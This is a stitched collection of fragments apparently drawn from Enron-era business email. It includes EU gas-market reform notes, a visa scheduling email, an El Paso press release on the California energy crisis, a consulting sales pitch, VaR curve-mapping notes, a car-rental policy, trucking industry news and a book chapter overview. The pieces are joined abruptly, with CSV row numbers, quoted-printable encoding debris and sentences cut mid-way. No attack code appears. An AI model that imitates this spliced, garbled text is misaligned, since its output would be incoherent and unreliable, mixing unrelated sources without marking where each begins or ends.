=20
one major gas supplier, to those with an =01+=01+emerging &#91;gas&#93; mar=
ket=20
status,=01,=01, or to those without a direct gas connection to the grid of =
another=20
member state. Most of the candidate countries would in principle be able to=
=20
call on one or more of these grounds for derogation when they join the=20
European Union.

* Price cross-subsidies. Residential gas tariffs are artificially low and a=
re=20
financed partially through higher rates applied to industrial consumers. In=
=20
various countries, tariff increases and the phasing out of subsidies have=
=20
been scheduled, but such decisions remain politically sensitive to enforce.=
=20
This has recently been emphasized by high gas prices owing to the linkage o=
f=20
imported gas to oil prices. All candidate countries have set legal framewor=
ks=20
that include the phasing out of cross-subsidies as part of sector reform, b=
ut=20
the actual implementation will remain politically difficult. As Table 1=20
indicates, price rebalancing is already under way in most countries expecte=
d=20
to enter the European Union by mid-decade, but the legal framework itself=
=20
cannot guarantee the pace of reform. The same goes for candidate countries=
=20
that have only recently introduced EU-complying energy laws and whose entry=
=20
to the European Union is likely to happen in a longer time frame.

* Unbundling. Most countries understand that the unbundling of transmission=
=20
companies from their supply businesses is the second critical element of=20
liberalization. To date, unbundling the accounts of these two businesses is=
=20
all that has been adopted by the member states or in the candidate countrie=
s.=20
In the future, the Commission is likely to press all EU countries for legal=
=20
separation (=01&structural unbundling=018) of the businesses, and candidate=
=20
countries will have to pursue their reform of the gas sector accordingly.

Table 1 gives an overview of the state of play in candidate countries. As t=
he=20
table shows, the countries belonging to the second group have only very=20
recently undertaken the reform of the gas sector in accordance with the=20
Directive, whereas change had been introduced earlier in the countries=20
scheduled for the first wave.

 the memo looks good.  One suggestion I have is to emphasize what we can 
deliver by end of January since that was the initial deadline.  Although the

know what he can get in his hand in terms of models or quantitative results.

setting up presentations may take time, you should think about creating some

As I mentioned in my voicemail to you today after seeing the note from Neil 
McGregor, there is no possible way that Anshuman could be in the US to work 
on February 5th.  Until I receive all of his documents, and the necessary 
information from you regarding his position in the US, I do not have the 
information to send to the attorneys for the visa application.

Once they receive the paperwork, they will need to prepare the documents in 
triplicate, and send to me.  At this stage, I will send the documents to 
Anshuman in India and he will need to make an appointment at the US Consulate 
in order to have the L1 visa stamped into his passport.  He will not be able 
to come to the States to work without this visa in his passport!  All of this 
could take approx. 3-4 weeks to accomplish.  I think March would be a more 
realistic timeframe!

Please let me have your thoughts.

Thank you for your reply.  Enron is delighted to be a part of the Wharton 
Business Plan Competition!

First, our assistant in the University Affairs Group, Melinda McCarty, will 
provide you with our logo.

Enron would definitely like to be Judge in Phase III and Participate in the 
Venture Fair, including the display table.

As to the mentoring and University community program, let;s discuss that 
further so I can better judge our way forward.

After I've had the chance to discuss all of this with our entire University 
Affairs and Wharton team here at Enron, you and I can get together to plan a 
more difinitive participatory strategy for Enron.  I will call you next week.

El Paso Addresses the California Energy Situation  ( February 26, 2001 )
 HOUSTON, Feb. 26 /PRNewswire/ -- El Paso Corporation (NYSE: EPG)
reaffirmed today its continuing commitment to work with all parties
involved to help improve California's energy situation. ""We are surprised
to see continuing misinformation in the media concerning El Paso's
involvement in California,"" said Norma Dunn, senior vice president of
Corporate Communications and External Affairs at El Paso Corporation. ""We
would like to take this opportunity to clarify the record.""  The
significant increase in electricity demand at a time when available power
supplies are short has caused a sharp climb in the price of power, which
has in turn increased the price of natural gas used to generate
electricity. High natural gas prices are, therefore, an effect rather than
a cause of the power shortage.  Allegations that natural gas prices were
deliberately manipulated by withholding capacity on the El Paso Natural Gas
pipeline overlook critical facts and are demonstrably untrue. It is not
possible for any holder of capacity on the El Paso Natural Gas pipeline to
cause a significant increase in California gas prices by refusing to use
that capacity. The El Paso Natural Gas pipeline is required by law to post
the availability of any unused capacity on its public bulletin board and is
obligated to sell that capacity for no more than the published tariff rate
found to be just and reasonable by the Federal Energy Regulatory
Commission. All capacity held by El Paso Merchant Energy on the El Paso
Natural Gas Pipeline has been used or made available for use by others to
serve California and other Western markets.  Allegations that there was a
""conspiracy"" in 1996 to limit new interstate pipeline capacity into
California are absolutely refuted by facts that no one can challenge. The
facts show that all new pipelines considered during the 1990s were either
built or were not viable projects because they lacked sufficient customer
support to justify their construction. For example, despite years of
marketing efforts by Tenneco, not a single potential customer could be
induced to make the sort of binding commitment required for the proposed
Altamont project to proceed. For that reason alone, it was ultimately
dropped. In 1996, according to estimates, there were between one and two
billion cubic feet per day (Bcf/d) of excess natural gas transportation
capacity on existing interstate pipelines serving California. Indeed, it
was misplaced reliance on the continuing availability of such excess
capacity that prompted the California Public Utilities Commission to
encourage PG&E, SoCal Edison, and SoCal Gas, beginning in 1996 and
continuing into 1998, to relinquish over 1.5 Bcf/d of firm transportation
capacity on the El Paso Natural Gas pipeline. Processes are now under way
to assess present demand and support for new interstate pipeline capacity
into California, and El Paso intends to do its part to help satisfy
whatever needs may be established today.  As recently as last year, there
were periods when significant quantities of unused capacity were available
on the El Paso Natural Gas pipeline that were not necessary to meet demands
at that time. Notwithstanding its availability, this capacity was not used
by shippers to California to fill in- state natural gas storage facilities
for future use. If California had taken advantage of the opportunity in
2000 to store the same volumes of natural gas that had been stored in 1999,
reliance on the spot market would have been reduced and the steep rise in
prices at the California border could have been substantially mitigated or
avoided.  It is now widely recognized that the California ""energy crisis""
was caused by the inability of the supply of power available in California
to keep pace with the state's economy and increased demand. A combination
of factors caused a sharp increase in power prices. First, the construction
of new power plants in California is a slow, difficult, and heavily
regulated process. As a result, the growing demand has far outstripped
in-state generating capabilities. Second, unfavorable precipitation and
increased out-of-state demand caused some of the hydroelectric power
normally relied on by California to become unavailable. Third, increased
demand for power in the western United States drove up prices that
California had to pay to out-of-state generators. Fourth, state policies
deregulated wholesale power prices but capped the rates paid by consumers,
leaving demand unrestrained and preventing utilities from recovering their
costs. Fifth, because rate caps prevented utilities from passing increased
costs to consumers, the utilities' creditworthiness was impaired, causing
supplemental power needed during peak periods to become more difficult and
expensive to purchase. Sixth, the early and greater-than-normal use of
peaking units-plants that are designed to only operate under peak demand
conditions-necessitated unscheduled maintenance, rendering them unavailable
at critical times. Seventh, during the final months of 2000, some power
plants were forced to shut down because increased usage exhausted their air
emissions credits. Eighth, a warm summer followed by an early onset of cold
weather further drove up demand for power. Finally, the increased power
costs in California could have been substantially mitigated through
long-term power contracts and less reliance on the volatile short-term
power market.  ""California is currently in a difficult position, but now
has the opportunity to refine its regulatory model and craft a long-term
energy policy,"" said Dunn. ""El Paso has been one of the largest suppliers
of energy to California for more than 50 years, and we are actively
participating with all parties in California to be a part of a long-term,
stable solution to California's energy needs.""  El Paso Corporation, the
largest and most broadly based natural gas company in the world, spans the
energy value chain from wellhead to electron. With an enterprise value in
excess of $50 billion, El Paso is a leader in every phase of the natural
gas industry. The company owns and operates a significant portion of the
North American natural gas delivery grid, operates the fastest growing,
most sophisticated energy merchant group, and is the nation's third largest
natural gas producer. El Paso, a leader in risk management techniques, is
focused on maximizing shareholder value, transforming existing markets, and
speeding the development of new markets. Visit El Paso at www.epenergy.com.

I have discovered the two sources of discrepancy in the ""transaction dollars"" 
on EOL, between my numbers and those of EOL. First, EOL records all index 
trades with the Henry Hub price (since the index price isn't, inadvertently, 
recorded with the trade, as I told you), whereas I went back and appended the 
contemporaneous index price to the trades. Second, EOL ignores all Basis 
trades in reporting transaction dollars, whereas I append a rough size to 
them of the ""price"" as the basis, times the quantity.

I'm sorry I wasn't ready in time with my numbers; I took the task of accuracy 
very seriously.

2604,"Vince:

Thanks for breakfast last Friday.  I have been reflecting on a couple of
your thoughts and very much want to take the steps forward you suggested.
Let me take a shot at articulating what we said to make sure I have it
right, and let me take a shot at making comments and suggestions.

Firstly, thanks for agreeing to bring MarketPoint to the attention of your
outside equity people once again.  I understand that you are a go between,
and I recognize and appreciate whatever efforts you are able to make.  I
also recognize as you admonished that there are no guarantees here and that
you can only do your best.  Thank you for that no matter what the outcome.

Secondly, your suggestion that our short term gas and electric models shoul=
d
be =01&click throughs=018 (my words intended to reflect the sentiment you
expressed) on the enrononline.com website are absolutely consistent with th=
e
MarketPoint business concept and right up our alley.  I unequivocally want
to move forward with that.  All that remains for MarketPoint to do so is to
secure the venture capitalization to create the website delivery system to
accommodate such click through and browser access.  We have the hard part
done (the enabling technology) and we only lack the internet delivery
system.  That should take a few months time after we secure the
capitalization we need.  However, in the meantime, we would be prepared to
put Excel spreadsheets with our scenarios in a web location where they can
be clicked through from enrononline.com, and that could be done a bit soone=
r
if you and your enrononline.com people might be interested in providing the
capitalization.  We already offer our North American electric plant data
base on a click though basis through e-acumen.com, so that part of our
infrastructure is already available (or imminent).  I believe they are goin=
g
commercial with our data product any time now.  Please let me know how we
can consummate an agreement here.

Thirdly, I am surmising there might be a lot of value to Enron from applyin=
g
and demonstrating MarketPoint in the more nascent areas of your business
where there are clearly few or no credible, comprehensive, pre-existing,
proprietary fundamental modeling tools (e.g., metals, telecommunications,
MIPS, agricultural commodities, water).  I would jump at the chance to work
under your sponsorship to build an inherently new, previously nonexistent
forward market model of a commodity such as copper, silver, gold, phosphate=
,
aluminum, potash, grain, or some other commodity you want to attack.  That
would give you an objective =01&kick at the can=018 unfettered by the fact =
that
there are previously existing models you might want to compare against each
other or against your own or that you have ongoing internal capabilities in
those areas.  You have the prospect to get immediate value from such a mode=
l
in your embryonic metal or other trading business and to evaluate
MarketPoint people and MarketPoint technology in a real life setting.  I
should mention that I have a relationship with what I consider to be the
premier mining/mineral processing group in the world (Michigan Technologica=
l
University).  Working with their metals/mineral processing professors, we
could build a world scope forward copper, gold, silver, aluminum, or simila=
r
model in several weeks time that considers every facility in every supply
chain in the world.  (Most metals have no more than several tens or a few
hundreds of facilities in the world total, and those facilities are well
known and accessible over the Internet or from trade associations or the
government.  Our United States Geological Survey contacts should be very
useful here.)  I really respect the Michigan Tech people I know.  They know
the metal supply chains all the way from the geology and resource
considerations at the extreme upstream end, the existing and prospective
ways to mine and process that resource into such intermediate goods as
pregnant leach solution, copper sulfide concentrate, gold cyanate, blister
copper, solvent extraction/electrowinning intermediate product, and
ultimately into final goods such as tubing, sheeting, wires, and other fina=
l
forms.  I would be prepared to send you a brief proposal and consulting
contract to undertake such an effort, and I am confident I can get Michigan
Tech to subcontract the data and domain expertise at modest cost.  They hav=
e
strong incentives to do something like this, for it connects them even more
closely to the industry they covet.  If you access the Michigan Tech
website, you will see a Dr. Carl Nesbitt (my brother) there as a mining and
minerals processor person.  He has recognized world class skills in that
field and is an Altos associate as well as a tenured Michigan Tech
professor.

Fourthly, I agree with your sentiment that =01&Enron has been quite success=
ful
with what we have been doing=018 and that =01&We lean toward our own techno=
logy.=018
I have the utmost respect and admiration for Enron and the technology and
thinking you have operationalized in the past.  Notwithstanding that
comment, I am sure Enron would not consider writing your own spreadsheet
code to replace Excel or writing your own C++ compiler to replace Microsoft=
=01,
s or writing your own LP code to avoid purchasing one commercially.  There
is simply no economic impetus to redo what comes from the commercial market
better and cheaper--Enron buys rather than builds technology that augments
your productivity, as you should, as long as it does not compromise
confidentiality or competitive advantage.  Vince, MarketPoint is technology
that augments Enron=01,s productivity and allows you to do what you want to=
 do
in the fundamental modeling area rapidly and accurately.  MarketPoint does
not substitute for or devalue your internally developed technology; it
augments and extends your people, data, and fundamental market insight.
MarketPoint already has over 200 man years of cumulative development effort
embedded within it, and it is just now becoming a custom =01&tinkertoy set=
=018
approach that Enron can use to enhance your productivity and accelerate wha=
t
you want to do in the fundamental modeling arena.  Like Excel, it has passe=
d
the market test for almost twenty years across the entire industry
(including Enron itself).  There are people in Enron today who I believe
hold MarketPoint/NARG in high esteem in part because they are aware of its
formidable and notable success over the past many years.  I hope you and
your people can come to view MarketPoint in that way=01*-an automated
productivity tool that can help Enron build and monitize proprietary conten=
t
faster, cheaper, and more accurately than you otherwise might and than your
competitors can.  MarketPoint might save you a lot of time and money, and i=
t
might allow you to redirect your resources toward even more productivity an=
d
profitability, just as Excel and Microsoft C++ have done.  With the advent
of e-commerce, your business is ultimately more =01&up for grabs=018 than i=
t once
was.  I must say I admire your early success and your early strong lead.
However, barriers to e-commerce entry are smaller than barriers to
traditional business entry, and ""branding"" is harder to hold.  You need to
continue and in fact accelerate the first mover advantage and ""branding"" yo=
u
have so successfully built in the past decade and a half, and I believe tha=
t
top quality, high barrier-to-entry, rapid deployment technologies such as
MarketPoint might help you do so.  I would even go one step further.  In th=
e
coming e-commerce era, technology such as MarketPoint will play even more o=
f
a role, and labor centric activities will be risky and (statistically) less
successful.  We are pleased MarketPoint is emerging at the start of today's
""inter-vertical competition"" era because we believe all the winners such as
Enron will ultimately need to use it if they are to be successful.
Increasingly, the ""not invented here"" approach is likely to be supplanted
with the ""cobble together elements of technology to make meta-technology""
because first mover advantage and branding will accelerate in value.
MarketPoint enabling technology is perfect for that.

Fifthly, I should mention that if any people in your traditional gas and
electric and other businesses want to use MarketPoint or Altos, please feel
free to contact me with the opportunity.  We are eager to serve their or
your immediate business needs as they encounter them in our traditional
consulting mode.  That was the point of the earlier meeting Kim Watson
organized, and that objective hopefully has not fallen by the wayside durin=
g
our private discussions.

After you have had a couple of days to think about the foregoing five
points, let=01,s talk.  I think if you get the chance to work with me and
MarketPoint, you will see that we are what we aspire to be--the ""Enron of
the fundamental forward pricing world""-=01*the best in class.  A partnershi=
p
between two bests in class certainly makes sense.  I know you have no basis
to believe that MarketPoint is best in class--it is new, and you and I have
not worked together in close proximity.  I am eager to provide you a low
cost, high value opportunity to determine whether that might be true.  Let'=
s
communicate by email or by phone in a week or ten days and see if we might
get something going.

I hope you agree that the speaker plenum and line-up of topics is possibly 
one of the best ever and not surprisingly the event is already drawing strong 
international interest. In particular the Executive Summit Day on e-Business 
and Power Trading is taking numerous bookings. I would be happy for you to 
attend either the Summit Day or one of our two intensive post conference 
workshops, but in order to avoid overcrowding on the day ask that all 
reservations be made in advance.

I am certain that you have friends or colleagues who would be interested in 
attending the conference this year, and would like to ask that you email the

""I provide evidence that Nasdaq dealers make markets in the stocks in which
they receive order flow.  Several variables used to proxy for the stocks
that individual market maker's brokerage customers would trade, including
trading volume, location, underwriting participation and analyst coverage,
are significant determinants of market marking activity.  Informational
advantages may also be a factor in the market making decision as evidenced
by dealers specializing in stocks in specific industries.  Some potential
problems that arise when researchers ignore the integration of market
making with brokerage, securities analysis and underwriting businesses are
discussed.""","Paul Schultz's Felicia

Bryan has been unable to find anyone suitable to attend this symposium on 
Saturday, so has suggested I attend, which I am happy to do. My only 
reservation is that my knowledge of this area is very limited, so it is 
likely I would just be an observer, rather than a participant. Anyway just so 
that I am adequately prepared could you briefly describe our current 
relationship with this project, and also suggest any reading, like a magazine 
or paper, that would quickly aid my understanding of the topics to be 
discussed.

Many thanks,

I just wanted to follow-up with you regarding the action items that were 
taken away from yesterday's meeting with you, Mike Roberts, Norma, and myself.

1)  Tony Hamilton
As you know Tony's official start date was March 12, 2001, and he has yet to 
receive a paycheck.  London's pay cycles are different than ours however, and 
they only get paid on the 20th of each month.  Tony did not receive a 
paycheck on March 20th because all of his new hire information has to be put 
into SAP (the payroll system) by the first of the month for the employee to 
receive a check on the 20th.  Consequently, Tony will not receive his first 
paycheck until April 20th.  If you would like for me to try and work with the 
London office however and try to get him a paycheck quicker than that, please 
let me know.

2)  Joe Carson
From what I am able to gather, Gary Hickerson did make Joe Carson an offer 
that consisted of a one-year contract.  However, Gary is out of town until 
Monday, and no one is sure of the specifics of the deal.  Would you like me 
to contace Joe to find out the specifics, or would it be more acceptable for 
me to wait until Gary returns so that I can get all of the facts.

I look forward to working with you.

Truckers still waiting for signs of pent-up freight demand; earnings 
shortfalls, layoffs loom 
If you are waiting for trucking to kick-start the nation's economic recovery, 
pull up a chair and wait awhile. Trucking CEOs say they haven't seen this 
slow a first quarter in a decade. 
""Perhaps the weakest first quarter for freight demand since Swift became a 
public company in 1990,"" Phoenix-based Swift Transportation Chairman and CEO 
Jerry Moyes said. 
The first-quarter trucking mantra historically has been this: everybody loses 
money in January, hopes for a break-even February and earns whatever profit 
there is in the quarter in March. That formula may not hold this year. 
Gregory L. Quesnel, president and CEO of Con-Way Transportation Services and 
Emery Worldwide parent CNF Inc., said the current slowdown was first detected 
late in the third quarter last year and has become ""more pronounced in each 
successive quarter."" March, he said, has been ""as disappointing as the first 
two months this year."" 
Layoffs already are occurring at the major LTL carriers. Yellow Freight 
System has idled as many as 1,000 Teamsters and hundreds of white-collar 
back-office workers. Most large carriers are warning of profit shortfalls 
that will cause them to miss analysts' first-quarter estimates. But there are 
deeper fears, too. Marginal players may be forced into bankruptcy. Small, 
family-owned carriers may be unable to exit the industry on their own terms 
because of the shocking decline in the value of used trucks that is causing 
some companies to be valued at less than half their worth of just two years 
ago. 
Swift's volume drop-off began with shipments originating on the West Coast in 
January and February and it is continuing in March, Moyes said. Coupled with 
reduced demand from the Southwest, Moyes said Swift will not meet analysts' 
first-quarter earnings expectations. Swift is not alone. 
""We hauled less freight in February than February a year ago,"" said Bob 
Hammel, executive vice president of Pittsburgh-based Pitt Ohio Express, a 
leading privately held Eastern regional LTL carrier. ""The slowdown in 
manufacturing began in the middle of last year and it was precipitous. Nobody 
anticipated the speed in which manufacturing demand fell off."" 
Even Con-Way, the most profitable LTL operation in the past five years, said 
it would have a decline in first-quarter operating income compared with the 
year-ago period. Con-Way's tonnage declines were estimated in the 
""mid-single-digit"" percentage range. 
Roadway Express estimated that its current tonnage levels are running 10 to 
11 percent below those a year ago, which will result in an approximately 
one-half of 1 percent (0.5 percent) decline in its operating ratio. (see 
sidebar) 
Pat Hanley, Overnite Transportation's senior vice president and chief 
financial officer, said freight figures were flat in February year over year 
but rose slightly in March. Overnite is the exception to the LTL industry 
with as many as 24 new terminals scheduled to be opened this year. 
""January was pretty good to us, but February was flat. It's coming back in 
March. We're probably up in low single digits, 3 to 4 percent. We're picking 
back up. The economy has hurt us. If you had asked us at the start of the 
year, we'd have said we'd be up double-digits,"" Hanley said. 
The national economic picture is ""a big concern,"" Hanley said. ""We're not 
seeing pressure on prices, at least not so far. We're seeing customers ship 
10 pallets a day instead of 20. The shipment size is coming down. Certainly 
we're concerned. We'll do O.K., but not as great as we'd like."" 
Forget consumer confidence surveys or the producer pricing index or whatever 
stars align in Federal Reserve Board Chairman Alan Greenspan's world. The 
genuine leading indicator of any national economic trend is trucking, which 
is always a first-in, first-out industry in any economic slowdown. 
To hear trucking industry leaders tell it, get comfortable with beans and 
franks for dinner. It's going to be awhile before it's filet mignon time 
again. 
Shippers see what's happening as well but say it's still too early in the 
year for carriers to start cutting rates to fill empty trucks. 
""All the carriers we talk with report flat or slightly declining business 
levels -- definitely slower than early last year,"" said Bill Huie, assistant 
vice president of corporate transportation for NCH Corp., Irving, Texas. 
""With a couple of exceptions, carriers we talk with have no plans for 
expansion in the next few months. We are getting feelers about some possible 
lane adjustments to boost revenue. But generally it appears a little early in 
the economic downturn for much price movement."" 
The national LTL carriers are seeing the same things. ""Our business is down 
pretty substantially for the first quarter,"" said Roger Dick, spokesman for 
Yellow Corp., parent of Yellow Freight System and two large regional LTL 
carriers, Jevic Transportation, Delanco, N.J., and Saia Motor Freight, 
Duluth, Ga. 
USFreightways Corp., citing what it called the nation's ""serious economic 
slowdown,"" said it expects first-quarter earnings to fall ""very substantially 
below"" current Wall Street consensus. 
Extreme weather conditions also contributed to the already weakened operating 
environment, USF Chairman, President and CEO Samuel K. Skinner added. 
""Traditionally, the first quarter builds momentum slowly, with March being 
the strongest month of the period,"" Skinner said in a statement. ""This year, 
the economic slowdown of the fourth quarter of 2000 accelerated in January 
and February, softening even the normal modest expectations for those two 
months."" 
It's not just the LTL industry that's hurting. The Morgan Stanley Dean Witter 
truckload freight index continues to show the worst demand-supply 
relationship since analyst James J. Valentine began tracking the data in 
April 1994. Two events can cause weakness in the index, according to 
Valentine. They are either an abundance of excess trucks on the road or weak 
freight demand. 
""So far in 2001, we have seen the confluence of both factors, but the 
fall-off in demand has far outpaced the increase in supply,"" Valentine wrote 
in his most recent ""Trucking Snapshot"" for early March. 
Year-to-date measurement for truckload demand is down 25 percent year over 
year, according to Valentine's index, while supply is up only 7 percent. That 
would indicate the over capacity was a significant issue last year but was 
""masked by the strong economy,"" Valentine says. 
In a more ominous note, Valentine believes overcapacity will continue to 
plague the truckload industry for the next one to two years. Only a 
reaccelerating national economy can bring the demand-supply back in balance 
for the truckload sector in the near term, Valentine predicts. 
The overproduction of new Class 8 trucks from early 1998 through early last 
year has put too many trucks on the roads and caused supply to back up at 
manufacturers, wholesalers and other retailers. Used trucks have lost on 
average more than 30 percent of their value over the past 18 months. 
Anecdotally, one used truck dealer, Music City Truck & Equipment, in 
LaVergne, Tenn., is holding a ""two-for-one"" sale on three- to five-year-old 
Class 8 Freightliners. You can buy two for around $30,000, less than a brand 
new Chevy Suburban SUV. 
What that means is a trucker who bought a 1998 Class 8 truck for $70,000 and 
depreciated half the value over three years has a piece of equipment on the 
books this year at $35,000. But assuming it has lost 30 percent of that 
value, it may only be worth $24,500 in actuality. For a carrier with a 
100-truck fleet, that equates to a loss of more than $1 million on assets. 
The glut may last for a while, according to Valentine's analysis. Assuming a 
three-year trade-in cycle, most of the Class 8 tractors in the truckload 
sector are just now rolling over to the used-truck market. That means that 
overcapacity will plague the truckload industry for at least the next year. 
That will result in some of the marginal carriers exiting the business, as 
did nearly 1,900 carriers last year that either closed or declared 
bankruptcy. 
""We can see from indexes, surveys and other information available to us that 
it is unlikely there will be any significant improvement in March and freight 
demands will continue to be soft throughout the month. Based on all of these 
factors, we expect USFreightways' profits for the first quarter to be very 
substantially less than published analysts' forecasts,"" Skinner said. 
In addition, severe weather conditions including an earthquake in Seattle, 
rainstorms in California and blizzards in the Northeast have added cost and 
decreased efficiencies, Skinner added. 
Expectations at each of USF's operating companies have been affected, some 
more than others. The LTL, logistics, reverse logistics and 
freight-forwarding units are all showing decreased revenue and volume over a 
similar period last year, Skinner said. 
Further job cuts at USF Worldwide, its freight forwarder, would be in the 
offing as cost controls at the unit would be ""accelerated"" in the wake of the 
softening economy, Skinner said. Late last year, Skinner said the rebuilding 
process at USF Worldwide would be a two-year process. But the worsening 
economy has made that rebuilding job harder, he said. 
""We are seeing evidence that the slowing economy is, in fact, further 
impeding progress in this area,"" Skinner said. ""During the fourth quarter of 
2000 and continuing into the first quarter of 2001, the company has taken 
steps to increase cost efficiencies. Among these actions are a substantial 
cutback in capital spending and significant reductions in the labor force. 
These cost-control efforts will be accelerated to partially counterbalance 
the damaging impact of the current economic and weather conditions."" 
In the 2000 first quarter, USF posted $22.3 million net income, a 27 percent 
rise from the $17.5 million earnings in the 1999 first quarter. At the time, 
that was USF's 15th straight quarter-over-quarter earnings increase. It came 
on $608.2 million revenue, an 18.5 percent rise in from the $513.2 million 
revenue in the 1999 first quarter. Analysts had been estimating USF to earn 
about $3.50 a share earnings for 2001, compared with actual $3.61 earnings 
per share for all of last year. In the fourth quarter last year, USF earned 
$23.7 million, or 91 cents a share.

                   has stated a price objective of $25 per barrel.
Capacity           Retail sales of Class 8 tractors (new trucks
                   entering the market) came down in January, but
                   inventory (trucks that will enter the market at some 
                   point) to sales ratio hit a new high of 3.4 months

Retail sales       Retail sales rose 0.7% in January. While this
                   was better than forecast, the upside was likely
                   the result of excessive clearance sales after a
                   disappointing holiday season.
Consumer           The Conference Board's measure of consumer

NAPM               The February NAPM rose slightly to 41.9.
                   However, it still indicates a contracting

WTI oil            Negative for all carriers, as $25 per

2638,"David,

During today's VaR coordination meeting  we had a discussion of issues 
related to mapping of the forward price curves into core locations.

Mapping is a  necessity dictated by the limitations of the computer system:
we have to reduce the dimensionality of the problem to stay within the bounds
of available CPU memory. Also, in some cases the quality of price discovery 
is poor 
and it's difficult to model the price curves independently: we solve the 
problem by mapping
them into more liquid and better behaved core  locations curves.

We have agreed on the following:

1. Winston will investigate the IT side and determine to what extent we can 
increase the number
of forward price curves that are simulated as basic (core) curves. He will 
investigate the impact of a larger
number of the core curves on the time required to complete the VaR run.

2. The curves associated with the biggest 10-20 positions in each commodity 
should be
modeled as core curves (i.e. no mapping into other locations). It makes sense 
to monitor
the biggest risks separately and avoid aggregating them into  less 
transparent aggregates.

3. The results of an automated clustering (mapping) procedures should be 
systematically
monitored by a human and corrected if they misrepresent the risks of the 
trading positions.
This responsibility should be vested with one person (right now the 
responsibility is
dispersed through the organization and this means in practice that nobody
is responsible). Research can allocate one person to this task;
cooperation of trading and RAC will be critical.

2643,"Car Rental Options for Enron Travelers

Rental car contracts for 2001 have been awarded to:

National Car Rental (Primary) and  Alamo Rent-A-Car (Secondary).  

The intent of these agreements is to consolidate and leverage Enron's total 
car rental spend to achieve the most favorable rates and non-pricing 
provisions (i.e. insurance).

National Car Rental, due to its service levels, availability and total value 
proposition, has been awarded Primary status and is recommended as the first 
choice for Enron travelers' needs.

Alamo Rent-A-Car, a sister company to National, has been awarded a contract 
reflecting a Secondary status, due to its service levels, availability and 
low cost solutions.  Alamo is recommended as an alternative to National, 
where available.

When you rent a vehicle in the United States, (including Puerto Rico) or 
Canada, the following insurance provisions are included, regardless of rate 
selected: 
1. L/DW (Loss/Damage Waiver) - This is what is called Comprehensive or 
Collision on your personal auto. It covers the rental vehicle and pays for 
any damage to it. 
2. Liability - This covers people and property outside the rental vehicle. 
For both National and Alamo, the coverage is $100,000 per person, $300,000 
per occurrence and $50,000 for property damage. 
** IMPORTANT ***
These coverages apply regardless of rate selected, as long as the following 
contract ID is communicated at the time of reservation and rental is recorded 
on the transaction rental agreement.  (National -  5000838 Alamo    - #143974)

To enjoy the highest levels of service while renting a vehicle from Enron's 
preferred suppliers, it is recommended that each traveler enroll in 
National's and Alamo's preferred traveler programs.  National's Emerald Club 
membership and Alamo's Quicksilver program are designed to speed the 
transaction time by providing services such as counter bypass and rapid 
return.  The enrollment fees for these programs have been waived for Enron 
travelers.  Enrollment packets will be mailed to the addresses of Enron 
American Express T&E Cardholders.  You may also find an enrollment form on

presenting at that session.  (Again, serving as a panelist should require
little preparation on your behalf.)

Also, you and your wife are welcome to attend the dinner on Friday evening,

2649,"I had a chance to speak with Christian LeBroc this morning with regard to 
curve building for petrochemicals.  As it turns out, Christian left RAC in 
April and joined the Petrochem Desk as a trader.  Previous efforts at 
construction of a forward curve by the group have focused on intuition or 
SWAGs.  Unfortunately, the group had a rough P&L year with at least some of 
the blame directed toward the forward curve or lack thereof.  When asked 
about the fundamentals group, Christian indicated that they'd only been 
around about 3-4 months and are not yet well-suited to curve building.  John 
Nowlan is indeed the head of the group.   

From a timing perspective, I told Christian that it would probably take at 
least 6-8 weeks to develop a curve, especially considering the need to 
understand the key market drivers/fundamentals.  As was suggested yesterday 
during our meeting, a strong relationship between petrochemicals and a NYMEX 
component (e.g., crude oil) would provide a great beginning point--we could 
then potentially strengthen/augment  this relationship with other key factors 
(e.g., supply and demand terms) borne out of our market research.

people a writing explaining his movie trading idea and asked us to provide 
some feedback.

I think the idea (see below) might be applicable to other parts of Enron. We 
can call it ""Dynamic bid-ask price process"".
In fact, we can set that the bidding period is closed when no new bid is 
submitted to the system within a specified amount of time. The final 
(clearing) bid and ask prices are just the last ""tentative"" price shown to 
the public before the bidding period ends. (So the customers can see the 
final price before the market close and can revise their bids if they wish.)

On Monday 21st February a new analyst will be joining Enron Europe, and will 
have his first rotation in the London Research Group.

Matthew Williams has a PhD in high energy physics, having carried out his 
research at Imperial College London and CERN.  His academic experience 
includes extensive monte carlo simulation as part of his research on the 
phenomenology of supersymmetry theories.

Matthew will be working with me on issues arising from the optimisation and 
control of dynamic systems, which we expect to include power generation

?

One of our main objectives in  writing Energy Derivatives: Pricing and Risk=
=20
Management has been to bring  together as many of the various approaches fo=
r=20
the pricing and risk management  energy derivatives as possible, to discuss=
=20
in-depth the models, and to show how  they relate to each other.? In this =
=20
way we hope to help the reader to analyse the different models, price a wid=
e =20
range of energy derivatives, or to build a risk management system which use=
s=20
a  consistent modelling framework.? We  believe that for practitioners this=
=20
last point is very important and we continue  to stress in our articles and=
=20
presentations the dangers of having flawed risk  management and giving=20
arbitrage opportunities to your competitors by using  ad-hoc and inconsiste=
nt=20
models for different instruments and markets (see also OTHERS WHO PROPOSE=
=20
CONSISTENT  MODELS?).? However, it is not  our wish to concentrate on one=
=20
particular model or models, at the exclusion of  the others because we=20
believe that the choice should rest with the user  (although it will probab=
ly=20
be clear from our discussions the model(s) we  prefer).? We therefore try a=
nd=20
give  as clear account as possible of the advantage and disadvantages of al=
l=20
the  models so that the reader can make an informed choice as to the models=
=20
which  best suit their needs.

?

In order to meet our objectives the  book is divided into 11 chapters.?  In=
=20
chapter 1 we give an overview of the fundamental principals needed to  mode=
l=20
and price energy derivatives which will underpin the remainder of the  book=
.?=20
In addition to introducing  the techniques that underlie the Black-Scholes=
=20
modelling framework we outline  the numerical techniques of trinomial trees=
=20
and Monte Carlo simulation for  derivative pricing, which are used througho=
ut=20
the book.

?

In Chapter 2 we discuss the  analysis of spot energy prices.? As  well as=
=20
analysing empirical price movements we propose a number of processes  that=
=20
can be used to model the prices.?  We look at the well-know process of=20
Geometric Brownian Motion as well as  mean reversion, stochastic volatility=
=20
and jump processes, discussing each and  showing how they can be simulated=
=20
and their parameters estimated.

?

Chapter 3, written by Vince  Kaminski, Grant Masson and Ronnie Chahal of=20
Enron Corp., discusses volatility  estimation in energy commodity markets.?=
 =20
This chapter builds on the previous one.? It examines in detail the methods=
, =20
merits and pitfalls of the volatility estimation process assuming different=
 =20
pricing models introduced in chapter 2.?  Examples from crude, gas, and=20
electricity markets are used to illustrate  the technical and interpretativ=
e=20
aspects of calculating volatility.

?

Chapter 4 examines forward curves  in the energy markets.? Although  such=
=20
curves are well understood and straight-forward in the most financial =20
markets, the difficulty of storage in many energy markets leads to less wel=
l =20
defined curves.? In this chapter we  describe forward price bounds for ener=
gy=20
prices and the building of forward  curves from market instruments.? We =20
outline the three main approaches which have been applied to building=20
